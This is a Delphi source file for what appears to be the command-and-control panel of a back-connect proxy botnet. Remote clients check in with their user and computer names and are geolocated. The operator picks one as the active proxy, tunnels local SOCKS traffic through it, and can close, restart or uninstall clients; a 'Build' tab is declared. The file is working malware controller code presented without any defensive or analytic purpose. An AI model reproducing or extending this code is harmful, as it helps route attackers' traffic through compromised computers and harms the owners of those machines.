unit uAltMain;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ComCtrls, ScktComp, uFuncs, Menus, WinSock, uSockets,
  ImgList, Inifiles;

type
  TSocksWorkerThread = class(TThread)
  private
    { Private declarations }
  protected
    procedure Execute; override;
  end;
type
  TProxyThread = class(TThread)
  private
    sockSocks  : TSocket;
    sockCMD    : TSocket;
    svrTunnel  : TSocket;
    sockTunnel : TSocket;
    intTrafficIn  : LongInt;
    intTrafficOut : LongInt;
    procedure ThreadEnd(Sender : TObject);
    procedure AddItem;
    procedure UpdateTraffic;
    procedure RemoveItem;
  protected
    procedure Execute; override;
  public
    CListItem : TListItem;
    constructor Create(Socks, CMD, Tunnel : Tsocket);
  end;
type
  TForm1 = class(TForm)
    pgc1: TPageControl;
    tsClients: TTabSheet;
    lvClients: TListView;
    tsConnections: TTabSheet;
    lvConnections: TListView;
    tsBuild: TTabSheet;
    tsSettings: TTabSheet;
    lbl1: TLabel;
    lbl2: TLabel;
    lbl3: TLabel;
    edtcmdport: TEdit;
    edttunnelport: TEdit;
    edtsocksport: TEdit;
    btnSavesettings: TButton;
    tsLog: TTabSheet;
    mmoLog: TMemo;
    tsAbout: TTabSheet;
    lblAbout: TLabel;
    svrCMD: TServerSocket;
    pmCommands: TPopupMenu;
    SetasactiveProxy1: TMenuItem;
    N1: TMenuItem;
    Close1: TMenuItem;
    Restart1: TMenuItem;
    Uninstall1: TMenuItem;
    ilMenu: TImageList;
    ilSinFlags: TImageList;
    procedure FormCreate(Sender: TObject);
    procedure OnException(Sender : Tobject; E : Exception);
    procedure svrCMDClientRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure svrCMDClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure svrCMDClientError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure SetasactiveProxy1Click(Sender: TObject);
    procedure lvClientsCustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure Close1Click(Sender: TObject);
    procedure btnSavesettingsClick(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  activesocket : Integer;
  //ThreadConnectionlist : TThreadList;
  settings : TINiFile;
implementation

{$R *.dfm}

procedure TProxyThread.AddItem;
begin
  Form1.lvConnections.Items.BeginUpdate;
  CListItem := Form1.lvConnections.Items.Add;
  CListItem.ImageIndex := 6;
  CListItem.Caption := IntToStr(sockSocks);
  CListItem.SubItems.Add('0');
  CListItem.SubItems.Add('0');
  CListItem.SubItems.Add('0');
  CListItem.Data := Self;
  Form1.lvConnections.Items.EndUpdate;
end;

procedure TProxyThread.UpdateTraffic;
begin
  CListItem.SubItems[0] := IntToStr(integer(sockTunnel));
  CListItem.SubItems[1] := FormatByteSize(intTrafficIn) ;
  CListItem.SubItems[2] := FormatByteSize(intTrafficOut);
end;

procedure TProxyThread.RemoveItem;
begin
  Form1.lvConnections.Items.BeginUpdate;
  Form1.lvConnections.Items.Delete(CListItem.Index);
  Form1.lvConnections.Items.EndUpdate;
end;


constructor TProxyThread.Create(Socks, CMD, Tunnel : TSocket);
begin
  inherited Create(False);
  sockSocks := Socks;
  sockCMD   := CMD;
  svrTunnel := Tunnel;
  FreeOnTerminate := True;
  OnTerminate := ThreadEnd;
end;

procedure TProxyThread.Execute;
var
  selset : TFDSet;
  Buf : array [0..32767] of byte;
  close : Boolean;
  recvlen : Integer;
  strCmd : Array[0..3] of Char;
begin
  Synchronize(AddItem);
  strCmd := 'SOCK';
  //sockSocks := TSocket(param);
  SendBuffer(sockCMD, strcmd, 4);
  If WaitForConnection(svrTunnel, 10) = False Then begin
    raise Exception.Create('Timeout on Tunnel Connection. Switch Proxys?');
    Exit; 
  end;
  sockTunnel := Accept(svrTunnel);      //TIMEOUT ???
  while not Terminated do begin
    FD_ZERO(selset);
    FD_SET(sockSocks, selset);     //timeout maybe?
    FD_SET(socktunnel, selset);
    if select(0, @selset, nil, nil, nil) = SOCKET_ERROR Then Break;
    if FD_ISSET(sockSocks, selset) then begin //data from master
      recvlen := ReceiveBuffer(sockSocks, Buf, SizeOf(Buf));
      if recvlen <=0 Then begin
        close := True;
      end;
      intTrafficOut := intTrafficOut + recvlen;
      if SendBuffer(socktunnel, Buf, recvlen) = SOCKET_ERROR then close := True;
    end;

   if FD_ISSET(socktunnel, selset) then begin //data from outside
      recvlen := ReceiveBuffer(socktunnel, Buf, SizeOf(Buf));
      if recvlen <=0 Then begin
        close := True;
      end;
      intTrafficIn := intTrafficIn + recvlen;
      if SendBuffer(sockSocks, Buf, recvlen) = SOCKET_ERROR then close := True;
    end;
    Synchronize(UpdateTraffic);
    if close = true then Break;
    Sleep(20);
  end;
  Disconnect(sockTunnel);
  Disconnect(sockSocks);
end;

procedure TProxyThread.ThreadEnd(Sender : TObject);
begin
  Synchronize(RemoveItem);
end;

procedure TSocksWorkerThread.Execute;
var
  svrTunnel : TSocket;
  svrsocks : TSocket;
begin
  svrTunnel := Listen('localhost', StrToInt(Form1.edtTunnelPort.Text));
  svrSocks  := Listen('localhost', StrToInt(Form1.edtSocksPort.Text));
  if (svrSocks = SOCKET_ERROR) or  (svrTunnel = SOCKET_ERROR) then begin
    MessageBoxA(0,'error thread', '', 0);
    exit;
  end;
  while true do begin
    if activesocket <> 0 then  begin
    //BeginThread(nil, 0, @TunnelFunc, Pointer(accept(svrSocks)), 0, tid);
      TProxyThread.Create(accept(svrSocks), activesocket, svrTunnel);
    end;
    //ThreadConnectionlists.Add(Threadobject);
    Sleep(50);
  end;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  Application.OnException := OnException;
  settings := TIniFile.Create(ExtractFilePath(ParamStr(0)) + 'settings.ini');
  edtcmdport.Text := IntToStr(settings.ReadInteger('Settings', 'CMDPort', 7070));
  edttunnelport.Text := IntToStr(settings.ReadInteger('Settings', 'TunnelPort', 8080));
  edtsocksport.Text := IntToStr(settings.ReadInteger('Settings', 'SocksPort', 9090));
  ////////////
  svrCmd.Port := strtoint(edtcmdport.Text);
  svrCMD.Active := True;
  TSocksWorkerThread.Create(false);
end;


procedure TForm1.OnException(Sender : Tobject; E : Exception);
begin
  mmoLog.Lines.Add(Format('%s : %s',[DateTimeToStr(Now),E.Message]));
end;

procedure TForm1.svrCMDClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
var
  dwlen : Integer;
  strdata, strcmd : String;
  listitem : TListItem;
  struser, strname : String;
begin
  dwlen := Socket.ReceiveLength;
  if dwlen = 0 then exit;
  strdata := ReadStringFromSocket(Socket);
  strcmd := Copy(strdata, 0, 4);
  strdata := Copy(strdata, 5, Length(strdata) - 4);
  if strcmd = 'ONLN' Then begin
      StrUser := Trim(Split(Strdata, '|', 1));
      StrName := Trim(Split(Strdata, '|', 2));
      ListItem := lvClients.Items.Add;
      listitem.ImageIndex := GetCountryFlag(GetCountryCode(Socket.RemoteAddress));
      ListItem.Caption := IntToStr(Socket.SocketHandle);
      ListItem.SubItems.Add(Socket.RemoteHost + ' / ' + Socket.RemoteAddress);
      ListItem.SubItems.Add(StrUser + ' / ' + StrName);
      ListItem.SubItems.Add(LookupCity(Socket.RemoteAddress));
      ListItem.Data := pointer(Socket.Sockethandle);
      lvClients.Items.EndUpdate;
      Socket.Data := Pointer(listitem.Index);
  end;
end;

procedure TForm1.svrCMDClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
  if socket.SocketHandle = activesocket then activesocket := 0;
  lvClients.Items.Delete(integer(socket.data));
end;

procedure TForm1.svrCMDClientError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
begin
  Socket.Close;
  ErrorCode := 0;
end;

procedure TForm1.SetasactiveProxy1Click(Sender: TObject);
var
  clistitem : TListItem;
begin
  CListItem := lvClients.Selected;
  if Assigned(CListItem) and (activesocket = integer(CListItem.Data)) then begin
    activesocket := 0;
    exit;
  end;

  if Assigned(CListItem) then
  begin
    activesocket := INteger(CListItem.Data);
  end;
  lvClients.Repaint;
end;

procedure TForm1.lvClientsCustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
const
  cStripe = $E0E0E0;  // colour of alternate list items
begin
{  if Odd(Item.Index) then
    // odd list items have background
    lvClients.Canvas.Brush.Color := cStripe
  else
    // even list items have window colour background
    lvClients.Canvas.Brush.Color := clWindow;   }
  if Item.Data = pointer(activesocket) then begin
    lvClients.Canvas.Font.Color := clBlack;
    lvclients.canvas.Brush.Color := clLime;
  end;
end;

procedure TForm1.Close1Click(Sender: TObject);
begin
  if assigned(lvClients.Selected) then
  SendString(integer(lvClients.Selected.Data), 'CLSE');
end;

procedure TForm1.btnSavesettingsClick(Sender: TObject);
begin
  settings.WriteInteger('Settings', 'CMDPort', StrToInt(edtcmdport.Text));
  settings.WriteInteger('Settings', 'TunnelPort', StrToInt(edttunnelport.Text));
  settings.WriteInteger('Settings', 'SocksPort', StrToInt(edtsocksport.Text));
end;

end.
